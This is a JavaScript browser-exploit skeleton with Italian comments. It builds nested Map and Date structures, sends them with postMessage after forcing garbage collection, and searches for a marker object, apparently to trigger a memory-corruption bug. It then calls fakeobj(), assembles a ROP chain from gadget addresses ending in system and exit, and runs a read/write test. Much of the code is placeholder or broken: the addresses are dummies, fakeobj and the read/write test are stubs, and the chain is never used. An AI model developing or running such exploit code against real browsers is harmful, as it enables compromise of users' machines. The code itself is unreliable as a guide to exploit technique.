const gadgets = {
    "pop_rdi": 0x0000000000401234,
    "pop_rsi": 0x0000000000405678,
    "pop_rdx": 0x0000000000409abc,
    "ret": 0x000000000040abcd,
    "system": 0x0000000000401111,
    "exit": 0x0000000000402222
};

// Garbage Collection
function gc() {
    try {
        new Uint8Array(256 * 1024);  // Usa un buffer per forzare il GC
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

// Crea la struttura di oggetti in memoria
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    for (let i = 0; i < 5; i++) { 
        foo.push(new Date(0xffff));  
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc();  // Trigger GC
    alert('Struttura oggetto creata');
    return root;
}

// RW Test Placeholder
function rwTest(address, value) {
    alert(`Test RW: Scrivo ${value} in ${address}`);
}

// Creazione della ROP Chain
function ropChain() {
    const chain = [];
    chain.push(gadgets.pop_rdi);
    chain.push(gadgets.pop_rsi);
    chain.push(gadgets.pop_rdx);
    chain.push(gadgets.ret);
    chain.push(gadgets.system);
    chain.push(gadgets.exit);
    return chain;
}

// Funzione per gestire fakeobj()
function fakeobj(target) {
    try {
        // Simula una lettura dell'indirizzo o restituisci un oggetto manipolato
        return target.fake || null; 
    } catch (e) {
        alert(`Errore in fakeobj(): ${e.message}`);
        return null;
    }
}

// Exploit principale
export async function main() {
    alert("Inizio exploit");

    const num_elems = 5;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let idx = null;
    let found = false;

    alert("Struttura iniziale creata");

    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event.data;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        postMessage(msg, origin);
        await prom;

        gc();  
        await sleep(100);

        try {
            for (let i = 0; i < num_elems; i++) {
                let key = data.keys().next().value;
                if (key && key.getTime && key.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante la ricerca: " + e.message);
            break;
        }
    }

    if (!idx) {
        alert("Indice non trovato: l'exploit si Ã¨ interrotto.");
        return;
    }

    alert(`[+] Indice trovato: ${idx}`);

    // Prova a usare fakeobj() per ottenere un ID valido
    let fake = fakeobj(root);
    if (!fake) {
        alert("fakeobj() ha restituito null. Impossibile continuare.");
        return;
    }

    alert("Fake object creato con successo!");

    // Proseguimento exploit
    let rop = ropChain();
    rwTest(0xdeadbeef, 0x1337);  
    alert("ROP chain e test RW completati");
}

// Avvia l'exploit quando viene premuto un pulsante
document.getElementById('button').addEventListener('click', async () => {
    await main();
});
